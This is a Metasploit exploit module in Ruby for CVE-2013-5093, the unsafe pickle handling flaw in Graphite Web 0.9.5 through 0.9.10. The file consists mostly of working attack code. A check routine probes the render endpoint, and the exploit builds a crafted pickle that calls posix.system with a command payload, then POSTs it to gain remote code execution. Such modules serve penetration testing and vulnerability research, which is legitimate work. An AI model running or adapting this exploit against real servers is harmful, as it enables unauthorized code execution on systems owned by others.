# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;       => &#039;Graphite Web Unsafe Pickle Handling&#039;,
      &#039;Description&#039;   => %q{
        This module exploits a remote code execution vulnerability in the pickle
        handling of the rendering code in the Graphite Web project between version
        0.9.5 and 0.9.10(both included).
      },
      &#039;Author&#039;     =>
        [
          &#039;Charlie Eriksen&#039; # Initial discovery and exploit
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;    =>
        [
          [ &#039;CVE&#039;, &#039;2013-5093&#039;],
          [ &#039;URL&#039;, &#039;http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/&#039;]
        ],
      &#039;Platform&#039;      => &#039;unix&#039;,
      &#039;Arch&#039;        => ARCH_CMD,
      &#039;Privileged&#039;    => false,
      &#039;Targets&#039;     => [ [&#039;Automatic&#039;, {} ] ],
      &#039;DisclosureDate&#039; => &#039;Aug 20 2013&#039;,
      &#039;DefaultTarget&#039;  => 0,
      &#039;Payload&#039;     =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;      => 16384,
          &#039;Compat&#039;    =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;python generic telnet netcat perl ruby&#039;
            }
        }))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a vulnerable application&#039;, &#039;/&#039;])
      ], self.class)

  end

  def check
    response = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;render&#039;, &#039;local&#039;),
      &#039;method&#039; => &#039;POST&#039;
    })

    if response and response.code == 500
      return Exploit::CheckCode::Detected
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    data = "line\ncposix\nsystem\np1\n(S&#039;#{payload.encoded}&#039;\np2\ntp3\nRp4\n."

    print_status("Sending exploit payload...")

    response = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;render&#039;, &#039;local&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039;    => data
    })
  end
end

